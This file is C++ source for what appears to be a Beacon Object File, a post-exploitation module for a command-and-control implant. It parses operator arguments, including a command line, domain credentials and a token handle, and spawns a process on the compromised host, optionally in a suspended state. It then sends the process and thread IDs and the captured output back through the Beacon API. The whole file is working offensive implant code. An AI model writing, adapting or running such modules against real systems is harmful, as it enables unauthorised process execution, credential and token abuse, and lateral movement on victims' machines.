#include "../kit/kit_process_creation.cc"

extern "C" auto go( char* args, int argc ) -> void {
    datap data_parser = { 0 };

    BeaconDataParse( &data_parser, args, argc );

    // parse bof args
    auto process_method    = (Create)BeaconDataInt( &data_parser );
    
    auto process_argument = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );
    auto process_state    = BeaconDataInt( &data_parser );
    auto process_pipe     = BeaconDataInt( &data_parser );

    auto process_domain   = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );
    auto process_username = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );
    auto process_password = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );

    auto process_token = (HANDLE)BeaconDataInt( &data_parser );

    NTSTATUS status = STATUS_SUCCESS;

    PS_CREATE_ARGS      create_args    = {};
    PROCESS_INFORMATION ps_information = {};

    create_args.method   = process_method;
    create_args.argument = process_argument;
    create_args.pipe     = process_pipe;

    create_args.domain   = process_domain;
    create_args.username = process_username;
    create_args.password = process_password;

    PBYTE output_ptr = nullptr;
    ULONG output_len = 0;

    if ( process_state ) {
        create_args.state = CREATE_SUSPENDED;
    }

    kh_process_creation( &create_args, &ps_information, &output_ptr, &output_len, FALSE );

    if ( ps_information.dwProcessId && ps_information.dwThreadId ) {
        BeaconPkgInt32( ps_information.dwProcessId );
        BeaconPkgInt32( ps_information.dwThreadId );   
    }

    if ( output_ptr && output_len ) {
        BeaconPkgBytes( output_ptr, output_len );

        free( output_ptr );
    }

    return;
}
